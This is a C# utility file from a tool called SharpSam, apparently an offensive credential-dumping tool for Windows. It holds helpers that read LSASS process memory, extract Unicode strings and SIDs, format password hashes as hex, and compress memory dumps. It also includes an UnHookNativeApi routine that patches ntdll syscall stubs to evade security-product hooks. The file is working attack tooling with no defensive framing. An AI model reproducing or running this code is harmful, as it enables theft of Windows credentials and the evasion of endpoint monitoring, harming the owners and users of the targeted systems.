using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Globalization;
using System.IO;
using System.IO.Compression;
using System.Runtime.InteropServices;
using System.Text;
using static SharpSam.Native;

using FILETIME = System.Runtime.InteropServices.ComTypes.FILETIME;

namespace SharpSam
{
    internal class Utils
    {
        public static byte[] Compress(byte[] minidumpBytes)
        {
            try
            {
                using (var resultStream = new MemoryStream())
                {
                    using (var gZipStream = new GZipStream(resultStream, CompressionMode.Compress))
                        gZipStream.Write(minidumpBytes, 0, minidumpBytes.Length);

                    var resultBytes = resultStream.ToArray();
                    return resultBytes;
                }
            }
            catch (Exception e)
            {
                Console.WriteLine("[*] Error while trying to compress memory: {0}", e.Message);
                return null;
            }
        }

        public static string PrintHashBytes(byte[] byteArray)
        {
            if (byteArray == null)
                return string.Empty;

            StringBuilder res = new StringBuilder(byteArray.Length * 2);
            for (int i = 0; i < byteArray.Length; i++)
            {
                res.AppendFormat(NumberFormatInfo.InvariantInfo, "{0:x2}", byteArray[i]);
            }
            return res.ToString();
        }

        public static int GetInt(IntPtr hLsass, IntPtr msvMem, long signOffset, int targetoffset)
        {
            long listMemOffset;
            IntPtr tmp_p = IntPtr.Add(msvMem, (int)signOffset + targetoffset);
            byte[] listMemOffsetBytes = Utils.ReadFromLsass(ref hLsass, tmp_p, 4);
            listMemOffset = BitConverter.ToInt32(listMemOffsetBytes, 0);

            int tmp_offset = 0;
            if (targetoffset > 0)
            {
                tmp_offset = (int)signOffset + targetoffset + sizeof(int) + (int)listMemOffset;
            }
            else
            {
                tmp_offset = (int)signOffset + (int)listMemOffset;
            }

            tmp_p = IntPtr.Add(msvMem, tmp_offset);
            byte[] intAddrBytes = Utils.ReadFromLsass(ref hLsass, tmp_p, 8);

            return BitConverter.ToInt32(intAddrBytes, 0);
        }


        public static string PrintHash(IntPtr lpData, int cbData)
        {
            byte[] byteArray = new byte[cbData];
            Marshal.Copy(lpData, byteArray, 0, cbData);

            return PrintHashBytes(byteArray);
        }
        public static DateTime ToDateTime(FILETIME time)
        {
            long fileTime = (((long)time.dwHighDateTime) << 32) | ((uint)time.dwLowDateTime);

            try
            {
                return DateTime.FromFileTime(fileTime);
            }
            catch
            {
                return DateTime.FromFileTime(0xFFFFFFFF);
            }
        }


        public static byte[] StringToByteArray(string hex)
        {
            int NumberChars = hex.Length;
            byte[] bytes = new byte[NumberChars / 2];
            for (int i = 0; i < NumberChars; i += 2)
                bytes[i / 2] = Convert.ToByte(hex.Substring(i, 2), 16);
            return bytes;
        }

        public static byte[] StructToBytes<T>(T str)
        {
            int size = Marshal.SizeOf(str);
            byte[] arr = new byte[size];

            IntPtr ptr = Marshal.AllocHGlobal(size);
            Marshal.StructureToPtr(str, ptr, true);
            Marshal.Copy(ptr, arr, 0, size);
            Marshal.FreeHGlobal(ptr);
            return arr;
        }
        public static byte[] GetBytes(byte[] source, long startindex, int lenght)
        {
            byte[] resBytes = new byte[lenght];
            Array.Copy(source, startindex, resBytes, 0, resBytes.Length);
            return resBytes;
        }

        public static string PrintHexBytes(byte[] byteArray)
        {
            StringBuilder res = new StringBuilder(byteArray.Length * 3);
            for (int i = 0; i < byteArray.Length; i++)
            {
                res.AppendFormat(NumberFormatInfo.InvariantInfo, "{0:x2} ", byteArray[i]);
            }
            return res.ToString();
        }

        public static string ExtractUnicodeStringString(IntPtr hLsass, UNICODE_STRING str)
        {
            if (str.MaximumLength == 0)
            {
                return null;
            }

            // Read the buffer contents for the LSA_UNICODE_STRING from lsass memory
            byte[] resultBytes = ReadFromLsass(ref hLsass, str.Buffer, str.MaximumLength);
            UnicodeEncoding encoder = new UnicodeEncoding(false, false, true);
            try
            {
                return encoder.GetString(resultBytes);
            }
            catch (Exception)
            {
                return PrintHexBytes(resultBytes);
            }
        }

        public static bool UnHookNativeApi(Native.WIN_VER_INFO pWinVerInfo)
        {
            byte[] AssemblyBytes = { 0x4C, 0x8B, 0xD1, 0xB8, 0xFF };
            AssemblyBytes[4] = (byte)pWinVerInfo.SystemCall;

            IntPtr ntdll = Native.LoadLibrary("ntdll.dll");
            IntPtr proc = Native.GetProcAddress(ntdll, pWinVerInfo.lpApiCall);

            IntPtr lpBaseAddress = proc;
            uint OldProtection = 0;
            uint NewProtection = 0;
            uint uSize = 10;
            var status = Sys.ZwProtectVirtualMemory10(Process.GetCurrentProcess().Handle, ref lpBaseAddress, ref uSize, 0x40, ref OldProtection);
            if (status != Native.NTSTATUS.Success)
            {
                Console.WriteLine("[x] Error ZwProtectVirtualMemory10 1 " + status);
                return false;
            }

            IntPtr written = IntPtr.Zero;
            IntPtr unmanagedPointer = Marshal.AllocHGlobal(AssemblyBytes.Length);
            Marshal.Copy(AssemblyBytes, 0, unmanagedPointer, AssemblyBytes.Length);

            status = Sys.ZwWriteVirtualMemory10(Process.GetCurrentProcess().Handle, ref proc, unmanagedPointer, (uint)AssemblyBytes.Length, ref written);
            if (status != Native.NTSTATUS.Success)
            {
                Console.WriteLine("[x] Error ZwWriteVirtualMemory10 " + status);
                return false;
            }

            status = Sys.ZwProtectVirtualMemory10(Process.GetCurrentProcess().Handle, ref lpBaseAddress, ref uSize, OldProtection, ref NewProtection);
            if (status != NTSTATUS.Success)
            {
                Console.WriteLine("[x] Error ZwProtectVirtualMemory10 2" + status);
                return false;
            }

            Marshal.FreeHGlobal(unmanagedPointer);

            return true;
        }

        public static bool IsElevated()
        {
            return TokenIsElevated(GetCurrentProcessToken());
        }

        public static IntPtr GetCurrentProcessToken()
        {

            IntPtr currentProcessToken = new IntPtr();
            if (!Native.OpenProcessToken(Process.GetCurrentProcess().Handle, Native.TOKEN_ALL_ACCESS, out currentProcessToken))
            {
                Console.WriteLine("Error OpenProcessToken " + new Win32Exception(Marshal.GetLastWin32Error()).Message);
                return IntPtr.Zero;
            }
            return currentProcessToken;
        }

        private static bool TokenIsElevated(IntPtr hToken)
        {
            Native.TOKEN_ELEVATION tk = new Native.TOKEN_ELEVATION();
            tk.TokenIsElevated = 0;

            IntPtr lpValue = Marshal.AllocHGlobal(Marshal.SizeOf(tk));
            Marshal.StructureToPtr(tk, lpValue, false);

            UInt32 tokenInformationLength = (UInt32)Marshal.SizeOf(typeof(Native.TOKEN_ELEVATION));
            UInt32 returnLength;

            Boolean result = Native.GetTokenInformation(
                hToken,
                Native.TOKEN_INFORMATION_CLASS.TokenElevation,
                lpValue,
                tokenInformationLength,
                out returnLength
            );

            Native.TOKEN_ELEVATION elv = (Native.TOKEN_ELEVATION)Marshal.PtrToStructure(lpValue, typeof(Native.TOKEN_ELEVATION));

            if (elv.TokenIsElevated == 1)
            {
                return true;
            }
            else
            {
                return false;
            }
        }

        public static byte[] ReadFromLsass(ref IntPtr hLsass, IntPtr addr, long bytesToRead)
        {
            if (bytesToRead < 0)
                throw new ArgumentException($"{bytesToRead} is not a valid number of bytes to read");

            if (bytesToRead == 0)
                return new byte[0];

            int bytesRead = 0;
            byte[] bytev = new byte[bytesToRead];

            NTSTATUS status = Sys.NtReadVirtualMemory10(hLsass, addr, bytev, (int)bytesToRead, bytesRead);

            return bytev;
        }

        public static T ReadStruct<T>(byte[] array)
    where T : struct
        {

            GCHandle handle = GCHandle.Alloc(array, GCHandleType.Pinned);
            var mystruct = (T)Marshal.PtrToStructure(handle.AddrOfPinnedObject(), typeof(T));
            handle.Free();

            return mystruct;
        }

        public static int FieldOffset<T>(string fieldName)
        {
            return Marshal.OffsetOf(typeof(T), fieldName).ToInt32();
        }

        public static byte[] ExtractSid(IntPtr hLsass, IntPtr pSid)
        {
            byte nbAuth;
            int sizeSid;

            Int64 pSidInt = Marshal.ReadInt64(pSid);

            byte[] nbAuth_b = Utils.ReadFromLsass(ref hLsass, IntPtr.Add(new IntPtr(pSidInt), 1), 1);
            nbAuth = nbAuth_b[0];

            sizeSid = 4 * nbAuth + 6 + 1 + 1;

            byte[] sid_b = Utils.ReadFromLsass(ref hLsass, new IntPtr(pSidInt), sizeSid);

            return sid_b;
        }

        public static T ReadStruct<T>(IntPtr addr)
            where T : struct
        {
            T str = (T)Marshal.PtrToStructure(addr, typeof(T));

            return str;
        }

        public static UNICODE_STRING ExtractUnicodeString(IntPtr hLsass, IntPtr addr)
        {
            UNICODE_STRING str;

            byte[] strBytes = ReadFromLsass(ref hLsass, addr, Marshal.SizeOf(typeof(UNICODE_STRING)));
            str = ReadStruct<UNICODE_STRING>(strBytes);

            return str;
        }
    }
}
